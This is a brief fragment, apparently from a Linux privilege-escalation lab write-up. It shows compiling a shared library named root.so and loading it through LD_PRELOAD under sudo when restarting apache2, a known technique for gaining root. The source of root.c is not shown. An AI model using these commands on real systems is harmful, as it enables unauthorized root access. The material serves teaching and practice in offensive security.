...
The shell above lists all the libraries required by /bin/ls, along with their absolute paths.
...
```bash
Student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```
...
```bash  
Student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
